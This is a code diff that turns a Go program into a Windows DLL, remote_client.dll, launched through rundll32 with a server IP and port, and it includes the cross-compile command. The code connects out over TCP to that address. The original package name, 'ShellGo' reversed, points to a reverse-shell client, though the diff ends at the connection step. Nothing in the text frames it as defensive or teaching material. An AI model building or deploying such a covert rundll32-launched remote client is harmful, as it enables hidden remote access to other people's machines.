@@ -1,4 +1,10 @@
-package oGllehS_EXE
+//go:build windows
+
+/*
+To build, edit the serverIp and serverPort variable, if wanted, and use the following command:
+GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -o remote_client.dll cmd/dll/main.go
+*/
+package main
 
 import (
 	"C"
@@ -10,20 +16,24 @@ import (
 	"syscall"
 )
 
-func main(hwnd uintptr, hinst uintptr, lpszCmdLine *C.char, nCmdShow int32) {
+func main() {
+
+}
+
+//export EntryPoint
+func EntryPoint(hwnd uintptr, hinst uintptr, lpszCmdLine *C.char, nCmdShow int32) {
 	// Parse command-line arguments
-
-	serverIP := ""
-	serverPort := ""
-
 	args := C.GoString(lpszCmdLine)
 	parts := strings.Split(args, " ")
 
-	if len(parts) != 0 {
-		serverIP = parts[0]
-		serverPort = parts[1]
-		address := fmt.Sprintf("%s:%s", serverIP, serverPort)
+	if len(parts) < 2 {
+		fmt.Println("Usage: rundll32 remote_client.dll,EntryPoint <serverIP> <serverPort>")
+		return
 	}
+
+	serverIP := parts[0]
+	serverPort := parts[1]
+	address := fmt.Sprintf("%s:%s", serverIP, serverPort)
 
 	// Connect to the server
 	conn, err := net.Dial("tcp", address)
